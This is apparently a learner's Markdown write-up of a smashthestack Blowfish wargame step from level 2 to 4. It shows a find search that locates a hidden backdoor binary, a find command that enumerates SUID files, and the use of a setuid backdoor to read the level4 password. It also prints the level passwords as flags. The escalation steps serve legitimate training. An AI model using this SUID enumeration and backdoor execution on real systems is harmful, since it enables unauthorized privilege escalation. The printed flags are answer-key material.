# Blowfish Level 02 → 04 find / -perm -4000 -type f 2>/dev/null

## Previous Flag
```
ThatWasEasy
```

## Goal
There is a backdoor to the next level hidden somewhere on this system, find it, and get the pass for level3 from /pass/level3<br>
Note: Think something wrong w/ level 2 → 3

## What I learned
```
find / -group level2 -user level3 2>/dev/null
    /                   start searching at root filesystem
    -group level2       only match files whose group owner is the group named level2
    -user level3        only match files whose user owner is the user named level3
    2>/dev/null         hide (redirect) error messages like “Permission denied” by sending them to /dev/null
```

## Solution
```
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker> ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa -l level2 blowfish.smashthestack.org -p 2222 ⌨️❤️
level2@blowfish.smashthestack.org's password: ⌨️ ThatWasEasy
level2@blowfish:~$ cat README ⌨️ 
There is a backdoor to the next level hidden somewhere on this system, find it, and get the pass for level3 from /pass/level3

level2@blowfish:~$ find / -name "hidden" 2>/dev/null ⌨️
level2@blowfish:/var/opt$ find / -group level2 -user level3 2>/dev/null ⌨️
/var/opt/.level3_backdoor 👀
level2@blowfish:~$ file /var/opt/.level3_backdoor ⌨️
/var/opt/.level3_backdoor: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.0, not stripped
level2@blowfish:~$ /var/opt/.level3_backdoor ⌨️
sh-3.2$ ls ⌨️
README
sh-3.2$ file README ⌨️
README: ASCII English text
sh-3.2$ cat README ⌨️
There is a backdoor to the next level hidden somewhere on this system, find it, and get the pass for level3 from /pass/level3
sh-3.2$ find / -group level2 -user level3 2>/dev/null ⌨️
/var/opt/.level3_backdoor
sh-3.2$ whoami ⌨️
level2
sh-3.2$ cat /pass/level3 ⌨️
cat: /pass/level3: Permission denied

# ChatGPT: Find SUID files on the system (read-only enumeration)
sh-3.2$ find / -perm -4000 -type f 2>/dev/null ⌨️
/bin/su
/levels/level9
/levels/level10
/levels/level4
/levels/level12
/levels/level5
/levels/level13
/levels/level11
/levels/level6
/levels/level7
/levels/level8
/var/local/.      level4_backdoor 👀
sh-3.2$ file /var/local/".      level4_backdoor" ⌨️
/var/local/.      level4_backdoor: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.2.0, not stripped
sh-3.2$ /var/local/".      level4_backdoor" ⌨️
sh-3.2$ whoami ⌨️
level4
sh-3.2$ cat /pass/level4 ⌨️ 
n3xt_l3v3l! 🔐
sh-3.2$ exit ⌨️
exit
sh-3.2$ exit ⌨️
exit
level2@blowfish:/var/opt$ exit ⌨️
logout
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker> ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa -l level4 blowfish.smashthestack.org -p 2222 ⌨️
level4@blowfish.smashthestack.org's password: ⌨️ n3xt_l3v3l!
level4@blowfish:~$ whoami ⌨️
level4
level4@blowfish:~$ ls ⌨️
exploit_level4.py  README
level4@blowfish:~$ exit ⌨️
logout
Connection to blowfish.smashthestack.org closed.
```

## Flag
n3xt_l3v3l!

## Continue
[Continue](./Blowfish0405.md)